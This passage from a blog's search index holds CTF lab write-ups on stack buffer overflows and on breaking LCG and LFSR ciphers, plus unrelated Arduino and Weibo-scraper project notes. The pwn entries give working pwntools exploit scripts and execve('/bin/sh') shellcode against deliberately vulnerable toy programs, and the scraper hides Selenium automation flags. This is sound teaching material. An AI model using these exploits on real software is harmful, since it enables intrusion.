\u0026#34;UTF-32LE\u0026#34;, \u0026#39;FLAG{h311O_revers1ng_3ngineer5}\u0026#39;,0 ::: 如何快速把bytes dump出來 :::spoiler 選擇要輸出的bytes 按Shift+E，跳出的視窗選擇想要的格式，再直接複製即可 ::: 如果函式沒有return東西的話，可以右鍵該函示，選擇Remove return value或是Shift+Del :::spoiler ::: 如果function中的宣告很多，可以右鍵選擇Collapse declarations :::spoiler ::: x64dbg 常用快捷鍵 # F2: 設定中斷點 F9: 繼續執行 F8: 步過 F7: 步入 Ctrl+F9: 執行到 ret ==Ctrl+G==: goto ==Space==: 修改組譯 靜態分析 # PEview PEViewer PE-bear 動態分析 # OllyDbg x64dbg IDA Ghidra Windbg PEtool Process相關的操作與資訊 # Procexp \u0026amp; Process Hacker 好看版的工作管理員 Procmon 監控程序行為 Registry File system Network Process/Thread 好用的解題工具 # angr - cheatsheet: $ pip install angr claripy z3: $ pip install z3-solver "},{"id":353,"href":"/side-project/side_project_lightbulb_control/","title":"side_project_lightbulb_control","section":"Side Projects","content":" side_project_lightbulb_control # tags: Side Project Arduino # :::spoiler [TOC] :::\nProject Purpose # In order to deal with the inconvenient experiment on lightbulb of bathroom, I decided to write some code and implent the circuit. Specifically speaking about the inconvenient, I wish exhaust fan in bathroom can always work without switch control it. But unfortunately, it has connected with lightbulb circuit at the beginning, and the circuit hided in the wall that I can\u0026rsquo;t change the circuit directly. The original circuit diagram is as the bottom left and the revised circuit diagram v1 is as the bottom right Arduino Circuit Diagram # Version 1 As the circuit above, when IR remote sensor received any infrared, it\u0026rsquo;ll illuminate LED just like a demo that it connects with an actual lightbulb. Cons: It must carry a mobile charger. And like I said, the circuit of the lightbulb hides in the wall, so the volume is too big to hide on the roof. The portable charger must replace regularly and that is much more inconvenient. Using IR remote sensor to control is not intuitive. When you\u0026rsquo;d like to turn on a lightbulb, you must find a remote controller first? That is not good obviously. Version 2 How does it work? I used two WIFI models (Node MCU CP2102) to control the lightbulb and switch that we pressed. If I turn on the switch, the CP2102 WIFI model will send a signal to WIFI AP and WIFI AP will resend it to another CP2102 hidden in the roof to illuminate the lightbulb. Pros It solved the portable charger that will make the volume too big to hide. I just use a useful plug as a transformer to output 5V DC and supply to the WIFI model. We don\u0026rsquo;t need to replace the charger because I just use an endless power(though I know it\u0026rsquo;s not a real endless) connect to AC 110 V directly. I used a simple switch to demo our habit instead of using an IR remote. I make it more convenient. Reference # Relay1 Relay2 Relay3 Relay4 IRRemote1 IRRemote2 WIFI1 WIFI2 [NodeMCU腳位](http://www.taichi-maker.com/homepage/esp8266-nodemcu-iot/esp8266-nodemcu-tutorial-index/nodemcu-board/ Recently Page for Ver.2 # 1 2 3 4 Very Important "},{"id":354,"href":"/side-project/side_project_weibo_hot/","title":"side_project_weibo_hot","section":"Side Projects","content":" side_project_weibo_hot # tags: Side Project Browser Automation Selenium # :::spoiler [TOC] :::\nSide Project Background # Inspired by Bilingual Podcast is the best podcast channel in Taiwan that introduces interesting news happening around the world. They said they had a problem that they can not get the hot news from Weibo immediately before Xi made it disappear. For instance, Shuai Peng(彭帥) and Zhang Gaoli(張高麗) event. So, I wrote a side project about an automatic web system that can refresh the web page and download it automatically and keep the data safe. Installation # pip install pyautogui pip install selenium Some Set-Up # Make sure your web driver is the latest version. You can download it here(https://chromedriver.chromium.org/) Make sure your desktop is the idle one in your home that you\u0026rsquo;ll not use it for a while. Make sure your desktop language keyboard is for English. Something can solve in the future # The content data you download may not be the same as the latest because I just verify the hot news title before downloading.(Solved, I refresh the news_list.txt every day and then the page with the same title will download again.)\nMaybe someone can write about the login part that not only needs account and password but the id verification. This is very hard to solve in this system.\n(Solved)Someone can use a more efficient searching Algorithm instead of linear searching and clean up the news list in the file to speed up the searching time. For instance, clean up all titles saved a week ago and always make the list lighter. I used the method that I mentioned above that cleans up the news_list.txt every day and that\u0026rsquo;ll make the searching time more efficient.\n(Solved)When you refresh the page many times, the server will reject the request from your desktop. So I add a file named run.py to solve this problem that used subprocess function independently in a while loop. That can lead the web to close completely and reboot again and again.\nThe web driver will shut down when the times up. But that will make the downloading file be aborted. So, maybe someone can add a function to detect whether the download process succeed or not.\nTo be continued\u0026hellip;\nUpdate # Time: 2022-11-29 In addition to update chrome driver, I also tried to run the whole program but not work because of the wrong redirection of weibo webpage. The page I expected is shown as below. But actually, drive got the page as below → In order to execute my program with slightly revise, I add these line to login. Refer to 使用Selenium实现微博爬虫：预登录、展开全文、翻页\nwait = WebDriverWait(driver,5) time.sleep(60) :writing_hand:Notes This program became a semi-automatic features.\nBecasue chrome driver halt with the message Chrome is being controlled by automated test software, I refer to (自動化初步-使用pyautogui)[https://ithelp.ithome.com.tw/articles/10267172] and set the code below to solve this problem.\noptions = webdriver.ChromeOptions() options.add_experimental_option(\u0026#34;excludeSwitches\u0026#34;, [\u0026#34;enable-automation\u0026#34;]) options.add_experimental_option(\u0026#39;useAutomationExtension\u0026#39;, False) options.add_experimental_option(\u0026#34;prefs\u0026#34;, {\u0026#34;profile.password_manager_enabled\u0026#34;: False, \u0026#34;credentials_enable_service\u0026#34;: False}) "},{"id":355,"href":"/security/course/ntu-cs/pwn/simple-buffer-overflow---0x00/","title":"Simple Buffer Overflow - 0x00","section":"Securities","content":" Simple Buffer Overflow - 0x00 # tags: CTF PWN # Original Code # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; int main() { char buf[0x10]; read(0, buf, 0x30); // It\u0026#39;ll read the value that you input and store in buf with length=0x30 system(\u0026#34;pause\u0026#34;); return 0; } Note that you can check this page to know more about read function Dynamic Analysis - x32dbg # This is the original entry point of this program. 0x00404185 is the read function that will catch the input string we entered. So, we step into this function and continued executing until 0x7655BFE5. The most important part In order to trigger buffer overflow, we must enter the string that size is over 16 to overlap ebp and eip register. If we enter a normal length string such as aaaaaaaaaaaaaaaa, the eip register will store 0x0040148A and finish the program normally. How about we enter 32 a characters? The ebp and eip register will be overlapped by 0x61616161(aaaaaaaaa) so that we can control the program flow by overlapping a specific address. Reference # PWN basic\n"},{"id":356,"href":"/security/course/ntu-cs/pwn/simple-buffer-overflow---0x01/","title":"Simple Buffer Overflow - 0x01","section":"Securities","content":" Simple Buffer Overflow - 0x01 # tags: CTF PWN # Follow the concept of lecture 0x00\nOriginal Code # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; void y0u_c4n7_533_m3() { execve(\u0026#34;/bin/sh\u0026#34;, (char *[]){0}, (char *[]){0}); } int main() { char buf[16]; puts(\u0026#34;This is your first bof challenge ;)\u0026#34;); fflush(stdout); read(0, buf, 0x30); system(\u0026#34;pause\u0026#34;); return 0; } The secret function is aim to create a shell, therefore, our main purpose is try to get the shell by using buffer overflow. We can check bof in the main function that it read the string with length 0x30 that bigger than buf size.\nNote that, if you establish the code yourself, you must turn off the protection by the command below and use checksec to observe the protection gcc -o bof3 bof3.c -zexecstack -no-pie -fno-stack-protector -z norelro Reference pwn_resource Exploit # Tried to get the address of y0u_c4n7_533_m3() by using objdump -d -M intel bof. → 0x4011b6 Then we can construct the payload as below: from pwn import * r = process(\u0026#39;./bof\u0026#39;) magic_addr = 0x4011b6 payload = b\u0026#39;a\u0026#39;*0x18 + p64(magic_addr) r.recvuntil(\u0026#39;;)\\n\u0026#39;) r.send(payload) r.interactive() Then we get shell!!! "},{"id":357,"href":"/security/course/ntu-cs/pwn/simple-buffer-overflow---0x02/","title":"Simple Buffer Overflow - 0x02","section":"Securities","content":" Simple Buffer Overflow - 0x02 # tags: CTF PWN # Why we\u0026rsquo;d like to create shellcode? # In pwn problem, most of the program don\u0026rsquo;t have the secret function that we can take the shell. Thus, we can create a shellcode by ourselves and use bof to overlap the original address by shellcode address. Then we can take the shell.\nHow to create a shellcode in BOF? # In lecture 0x01, we can see sub-function that create a shell using command:\nexecve(\u0026#34;/bin/sh\u0026#34;, (char *[]){0}, (char *[]){0}); According to Linux System Call Table for x86 64, we can see that execve is a system call and the parameter sequence is as the same as normal calling convention.\nNote that in x86-64 → The kernel interface uses RDI, RSI, RDX, R10, R8 and R9. In C++, this is the first parameter.\n%rax System Call %rdi %rsi %rdx %r10 %r8 %r9 59(0x3B) sys_execve const char *filename const char *const argv[] const char *const envp[] Therefore, %rdi store address of /bin/sh and %rsi, %rdx can temporarily set 0\nImplement # mov rbx, 0x68732f6e69622f push rbx mov rdi, rsp xor rsi, rsi xor rdx, rdx mov rax, 0x3b syscall We can use hex2text tool to parse .0x68732f6e69622f and we obtain ?hs/nib/ First 3 line, we push /bin/sh to stack and %rsp is the top of the stack address, so we %rdi will obtain /bin/sh address from %rsp Then, let %rsi and %rdx be 0 To set %rax to right system call number, that is 0x3b Finally, we did it!!! Reference # NTUSTISC - Pwn Basic 2 [2019.03.19]\n"},{"id":358,"href":"/security/course/ntu-cs/pwn/simple-buffer-overflow---0x04/","title":"Simple Buffer Overflow - 0x04","section":"Securities","content":" Simple Buffer Overflow - 0x04 # tags: CTF PWN # Original Code # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; char message[48]; int main() { char name[16]; printf(\u0026#34;Give me your message: \u0026#34;); fflush(stdout); read(0, message, 0x30); fflush(stdout); read(0, name, 0x30); return 0; } Actually, this is a variant of the lecture 0x01\nNote that, the global variable has its own address, instead of local variable that push to stack that we don\u0026rsquo;t know at first.\nThe 1st read function has no overflow, but 2nd read function has.\nNote that, if you establish the code yourself, you must turn off the protection by the command below and use checksec to observe the protection\ngcc -o bof3 bof3.c -zexecstack -no-pie -fno-stack-protector -z norelro Note that: must use mprotect to change permission access just like lecture 0x04, add these line in original code\n#include \u0026lt;sys/mman.h\u0026gt; mprotect(0x403000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC); Before mprotect - vmmap After mprotect - vmmap Exploit # The main idea of this problem is write down your shellcode in message global variable and use BOF of 2nd read function to overlap %rip\nFirst, observe the address of global variable - message → 4033c0 So, we have to construct our shellcode in lecture 0x02\nfrom pwn import * r = process(\u0026#39;./bof3\u0026#39;) raw_input() # First, we must set our infrastructure of the platform context.arch = \u0026#39;amd64\u0026#39; # x86-64 → amd64, x86-32 → i386 # asm function transfer your shellcode to machine language shellcode = asm(\u0026#39;\u0026#39;\u0026#39; mov rbx, 0x68732f6e69622f push rbx mov rdi, rsp xor rsi, rsi xor rdx, rdx mov rax, 0x3b syscall \u0026#39;\u0026#39;\u0026#39;) r.send(shellcode) # Send to 1st read function payload = b\u0026#39;a\u0026#39; * 0x18 + p64(0x4033c0) r.send(payload) # Send to 2nd read function that has bof r.interactive() Note that, the 3 methods below are equal\nshellcode = asm(\u0026#39;\u0026#39;\u0026#39; mov rbx, 0x68732f6e69622f push rbx mov rdi, rsp xor rsi, rsi xor rdx, rdx mov rax, 0x3b syscall \u0026#39;\u0026#39;\u0026#39;) Made by Online x86 / x64 Assembler and Disassembler shellcode = asm(\u0026#39;\\x48\\xBB\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x00\\x53\\x48\\x89\\xE7\\x48\\x31\\xF6\\x48\\x31\\xD2\\x48\\xC7\\xC0\\x3B\\x00\\x00\\x00\\x0F\\x05\u0026#39;) Made by pwntools built-in function shellcode = asm(shellcraft.sh()) Then we got shell!!! "},{"id":359,"href":"/security/course/ntu-cs/pwn/simple-buffer-overflow---0x05leak-canary/","title":"Simple Buffer Overflow - 0x05(Leak Canary)","section":"Securities","content":" Simple Buffer Overflow - 0x05(Leak Canary) # tags: CTF PWN eductf # Canary Background # Original Code # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; void backdoor() { system(\u0026#34;/bin/sh\u0026#34;); } int main() { setvbuf(stdin, 0, _IONBF, 0); setvbuf(stdout, 0, _IONBF, 0); char name[0x10]; char phone[0x10]; printf(\u0026#34;What\u0026#39;s your name: \u0026#34;); read(0, name, 0x100); printf(\u0026#34;Hello, %s !\u0026#34;, name); printf(\u0026#34;What\u0026#39;s your phone number: \u0026#34;); read(0, phone, 0x100); return 0; } Note that, if you establish the code yourself, you must turn off the protection by the command below and use checksec to observe the protection gcc -o bof2_leak_canary bof2_leak_canary.c -zexecstack -no-pie -z norelro Exploit # First, we can use objdump -d -M Intel {filename} to check the address of backdoor → 0x4011b6 However, we observe the backdoor function, it just call system instead of execsv. So, that you may encounter some error because of non-alignment. The solution is skip the push %rbp instruction and just jump to 0x4011bb\nThe detailed description can refer to lecture video Then we can construct a part of the payload below:\nfrom pwn import * context.arch = \u0026#39;amd64\u0026#39; r = process(\u0026#39;./bof2_leak_canary\u0026#39;) raw_input() no_push_rbp_backdoor_addr = 0x4011bb Then we have to overlap name variable and phone variable with length 0x20. In addition, the compiler will align 8 bytes, we should overlap it as well. Moreover, the last byte of canary is always 0x00, then if we\u0026rsquo;d like to print out canary value, we should overlap it as well.(In pwntools, recvuntil function default consider 0x00 is a new line)\nr.sendafter(\u0026#34;What\u0026#39;s your name: \u0026#34;, b\u0026#39;a\u0026#39; * 0x29) #0x20 → name + phone / 0x08 for compiler alinment / 0x01 for canary last byte r.recvuntil(\u0026#39;a\u0026#39;*0x29) canary = u64(b\u0026#39;\\x00\u0026#39; + r.recv(7)) print(\u0026#34;canary: \u0026#34;, hex(canary)) Final step, we do what we done before to overlap padding + phone variable(0x18) + original canary(0x08) + original $rbp``(0x08) + overlap $rip to backdoor.\nr.sendafter(\u0026#34;What\u0026#39;s your phone number: \u0026#34;, b\u0026#39;a\u0026#39; * 0x18 + p64(canary) + p64(0xdeadbeef) + p64(no_push_rbp_backdoor_addr)) The whole payload is shown as below:\nfrom pwn import * context.arch = \u0026#39;amd64\u0026#39; r = process(\u0026#39;./bof2_leak_canary\u0026#39;) raw_input() no_push_rbp_backdoor_addr = 0x4011bb r.sendafter(\u0026#34;What\u0026#39;s your name: \u0026#34;, b\u0026#39;a\u0026#39; * 0x29) #0x20 → name + phone / 0x08 for compiler alinment / 0x01 for canary last byte r.recvuntil(\u0026#39;a\u0026#39;*0x29) canary = u64(b\u0026#39;\\x00\u0026#39; + r.recv(7)) print(\u0026#34;canary: \u0026#34;, hex(canary)) r.sendafter(\u0026#34;What\u0026#39;s your phone number: \u0026#34;, b\u0026#39;a\u0026#39; * 0x18 + p64(canary) + p64(0xdeadbeef) + p64(no_push_rbp_backdoor_addr)) Then we got shell Analysis # About how to print canary: Use gdb and execute to the first print, you can see that the stack structure. And we can print canary value from payload program → 0xdf38469d4e106500 Note that we can get tls address and +0x28 to compare with canary value Reference # Lecture Vid. - Pwn week1\n"},{"id":360,"href":"/security/course/ntu-cs/crypto/simple-crypto---0x01modular-operation/","title":"Simple Crypto - 0x01(Modular Operation)","section":"Securities","content":" Simple Crypto - 0x01(Modular Operation) # tags: CTF Crypto eductf # Background # 『Day 23密碼卷宗現代篇非對稱章 - RSA 模运算与逆元 模運算基本特性: $$ (a + b) % p = (a % p + b % p) % p \\ (a - b) % p = (a % p - b % p) % p \\ (a * b) % p = (a % p * b % p) % p \\ (a ^ b) % p = ((a % p) ^ b ) % p $$ 模運算的结合律： $$ ((a + b) % p + c) % p= (a + (b + c) % p) % p \\ ((a * b) % p * c) % p = (a * (b * c) % p ) % p $$ 交換律： $$ (a + b) % p = (b+a) % p \\ (a * b) % p = (b * a) % p $$ 分配率： $$ ((a +b) % p * c) % p = ((a * c) % p + (b * c) % p) % p $$\n同餘要進行除法時該怎麼處理\n基本數學 What does a|b mean in mathematics?\nSource Code # Analysis # Exploit # Reference # "},{"id":361,"href":"/security/course/ntu-cs/crypto/simple-crypto---0x02random-number-generator---lcg/","title":"Simple Crypto - 0x02(Random Number Generator - LCG)","section":"Securities","content":" Simple Crypto - 0x02(Random Number Generator - LCG) # tags: CTF Crypto eductf # Background # Linear Congruential Generator: Analysis # LCG Formula $$ \\begin{aligned} Unknown: S_0\u0026amp;=Seed,\\ A,\\ B,\\ m = 2^{32} \\ Given: S_1\u0026amp;,\\ S_2,\\ S_3\\ S_1 \u0026amp;\\equiv (AS_0\\ +\\ B)\\ %\\ m\\ S_2 \u0026amp;\\equiv (AS_1\\ +\\ B)\\ %\\ m\\ S_3 \u0026amp;\\equiv (AS_2\\ +\\ B)\\ %\\ m\\ \\end{aligned} $$\nDerived A $$ \\begin{aligned} \u0026amp;\\left{ \\begin{array}{c} S_2 \u0026amp;\\equiv (AS_1\\ +\\ B)\\ %\\ m\\ S_3 \u0026amp;\\equiv (AS_2\\ +\\ B)\\ %\\ m \\end{array} \\right. \\ \\ \\ \\ \\ \\ minus \\ two \\ formula\\ \\ \u0026amp;\\to (S_2-S_3) \\equiv (AS_1\\ +\\ B)\\ %\\ m-(AS_2\\ +\\ B)\\ %\\ m \\ \u0026amp;\\to (S_2-S_3)\\ % \\ m\\equiv [(AS_1\\ +\\ B)\\ %\\ m-(AS_2\\ +\\ B)\\ %\\ m]\\ %\\ m \\ \u0026amp;\\to (S_2-S_3)\\ % \\ m\\equiv [(AS_1\\ +\\ B)-(AS_2\\ +\\ B)]\\ %\\ m \\ \u0026amp;\\to (S_2-S_3)\\ % \\ m\\equiv \\ A\\ (S_1-S_2)\\ \\ %\\ m =(S_2-S_3)\\ A\u0026amp;=((S_2-S_3)(S_1-S_2)^{-1})\\ %\\ m \\end{aligned} $$\nNote $$ \\begin{aligned} a\\ %\\ m\u0026amp;=\\ b \\ a\\ %\\ m\u0026amp;=\\ b \\ %\\ m= \\ b\\ \\end{aligned} $$\nDerive B $$ B=(S_2\\ -\\ AS_1)\\ %\\ m $$\nDerive m $$ m=gcd((t_{n+1}t_{n-1}-t_n^2),(t_nt_{n-2}-t_{n-1}^2)) $$\nImplement Code # import random from Crypto.Util.number import inverse import math # Encrypt something class LCG(): def __init__(self, seed) -\u0026gt; None: self.state = seed self.m = 2**32 self.A = random.getrandbits(32) | 1 self.B = random.getrandbits(32) | 1 def getbits(self): self.clock() return self.state def clock(self): # self.tmp = (self.A * self.state + self.B) // self.m self.state = (self.A * self.state + self.B) % self.m # print(\u0026#39;tmp = \u0026#39;, self.tmp) rng = LCG(6401) print(\u0026#39;A = \u0026#39;, rng.A, \u0026#39;B = \u0026#39;, rng.B, \u0026#39;m = \u0026#39;, rng.m) S = [] for i in range(3): S.append(rng.getbits()) print(\u0026#39;S = \u0026#39;, S) Exploit # 密码学——LCG算法 公式2\n# Exploit it # A A = (S[1] - S[2]) * inverse((S[0] - S[1]), rng.m) % rng.m print(\u0026#39;Exploit A = \u0026#39;, A) # B B = (S[2] - A * S[1]) % rng.m print(\u0026#39;Exploit B = \u0026#39;, B) Reference # getrandbits method\n"},{"id":362,"href":"/security/course/ntu-cs/crypto/simple-crypto---0x032023-lab---cor/","title":"Simple Crypto - 0x03(2023 Lab - COR)","section":"Securities","content":" Simple Crypto - 0x03(2023 Lab - COR) # Background # Simple Crypto - 0x03(Lab - LFSR)\nSource Code # :::spoiler\nimport random from secret import FLAG class LFSR: def __init__(self, tap, state): self._tap = tap self._state = state def getbit(self): f = sum([self._state[i] for i in self._tap]) \u0026amp; 1 x = self._state[0] self._state = self._state[1:] + [f] return x class triLFSR: def __init__(self, lfsr1, lfsr2, lfsr3): self.lfsr1 = lfsr1 self.lfsr2 = lfsr2 self.lfsr3 = lfsr3 def getbit(self): x1 = self.lfsr1.getbit() x2 = self.lfsr2.getbit() x3 = self.lfsr3.getbit() return x2 if x1 else x3 lfsr1 = LFSR([0, 1, 2, 5], [random.randrange(2) for _ in range(19)]) lfsr2 = LFSR([0, 1, 2, 5], [random.randrange(2) for _ in range(23)]) lfsr3 = LFSR([0, 1, 2, 5], [random.randrange(2) for _ in range(27)]) cipher = triLFSR(lfsr1, lfsr2, lfsr3) flag = map(int, \u0026#39;\u0026#39;.join([\u0026#34;{:08b}\u0026#34;.format(c) for c in FLAG])) output = [] for _ in range(200): output.append(cipher.getbit()) for b in flag: output.append(cipher.getbit() ^ b) print(output) # [0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 0] :::\nRecon # 這是一個簡單的LFSR題目，基本上和去年的題目一樣，只是有一些小變動，諸如taps或是bits的強度不一樣之類的，但經過調整後還是可以沿用去年寫的script，\n簡單來說，雖然題目使用了三層的LFSR確保每一次getBit都會有一定的亂度，但因為x2和x3對於output而言有75%的高機率重複性(如下圖)，所以我們可以針對這一店進行correlation attack，也就是我們可以猜LFSR2和LFSR3的輸出情況(枚舉)，既然output和LFSR2/3各有75%重複，我們可以個別猜，也就是先對其中個枚舉，然後對照output和LFSR吐出的gussing output有沒有超過threshold(例如70%)，如果有就可以把該guessing state存起來，基本上guessing state應該高機率只會有一個，但就算高過一個也沒關係，反正之後要找LFSR1時，再個別考慮即可 等到個別找到LFSR2/3後，就可以模擬一開始的算法，題目一開始產生output的方式是x2 if x1 else x3，所以就像找LFSR2/3一樣，只是把threshold調到1，全部找完之後久可以得到flag了\nExploit # :::spoiler Whole Script\nfrom tqdm import trange def initialize(): f = \u0026#39;0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 0\u0026#39; f = f.split(\u0026#39;, \u0026#39;) # The first 232 is flag with encrypted cipher_text = [] cipher_flag = [] for i in range(len(f)): if i \u0026gt; 199: cipher_flag.append(int(f[i])) else: cipher_text.append(int(f[i])) return cipher_flag, cipher_text def cal_correlation(a, b): count = 0 for i in range(200): if a[i] == b[i]: count += 1 return count / 200 class LFSR: def __init__(self, tap, state): self._tap = tap self._state = state def getbit(self): f = sum([self._state[i] for i in self._tap]) \u0026amp; 1 x = self._state[0] self._state = self._state[1:] + [f] return x class triLFSR: def __init__(self, lfsr1, lfsr2, lfsr3): self.lfsr1 = lfsr1 self.lfsr2 = lfsr2 self.lfsr3 = lfsr3 def getbit(self): x1 = self.lfsr1.getbit() x2 = self.lfsr2.getbit() x3 = self.lfsr3.getbit() return x2 if x1 else x3 def guess_state(state_size_pow, tap, cipher_text): guess_state = [0 for _ in range(state_size_pow)] # Initial guess state result = [] for state in trange(2**state_size_pow): guess_text = [] lfsr = LFSR(tap, guess_state) for _ in range(200): guess_text.append(lfsr.getbit()) for _ in range(216): lfsr.getbit() acc = cal_correlation(guess_text, cipher_text) if acc \u0026gt;= 0.70: print(guess_state) result.append(guess_state) break tmp = bin(state)[2:] guess_state = [0 for i in range(state_size_pow - len(tmp))] + [int(tmp[i]) for i in range(len(tmp))] return result def final_guess(state_size_pow, tap, cipher_text, b_guess_state, c_guess_state): guess_state = [0 for _ in range(state_size_pow)] # Initial guess state for state in trange(223926, 2**state_size_pow): guess_text = [] lfsr1 = LFSR(tap[0], guess_state) lfsr2 = LFSR(tap[1], b_guess_state) lfsr3 = LFSR(tap[2], c_guess_state) cipher = triLFSR(lfsr1, lfsr2, lfsr3) for _ in range(200): guess_text.append(cipher.getbit()) for _ in range(216): cipher.getbit() acc = cal_correlation(guess_text, cipher_text) if acc == 1: print(guess_state) return guess_state tmp = bin(state)[2:] guess_state = [0 for i in range(state_size_pow - len(tmp))] + [int(tmp[i]) for i in range(len(tmp))] if __name__ == \u0026#39;__main__\u0026#39;: cipher_flag, cipher_text = initialize() tap = [[0, 1, 2, 5], [0, 1, 2, 5], [0, 1, 2, 5]] B_guess_state = guess_state(23, tap[1], cipher_text) # [1, 1, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1] C_guess_state = guess_state(27, tap[2], cipher_text) # [0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1] A_guess_state = final_guess(19, tap, cipher_text, B_guess_state, C_guess_state) # [0, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0] # B_guess_state = [1, 1, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1] # C_guess_state = [0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1] # A_guess_state = [0, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0] lfsr1 = LFSR(tap[0], A_guess_state) lfsr2 = LFSR(tap[1], B_guess_state) lfsr3 = LFSR(tap[2], C_guess_state) cipher = triLFSR(lfsr1, lfsr2, lfsr3) output = [] plaintext_bin = \u0026#39;\u0026#39; plaintext_hex = \u0026#39;\u0026#39; tmp = [] for _ in range(200): tmp.append(cipher.getbit()) assert tmp == cipher_text for i, b in enumerate(cipher_flag): plaintext_bin += str(cipher.getbit() ^ b) if (i+1) % 8 == 0: plaintext_hex += hex(int(plaintext_bin, 2))[2:] plaintext_bin = \u0026#39;\u0026#39; 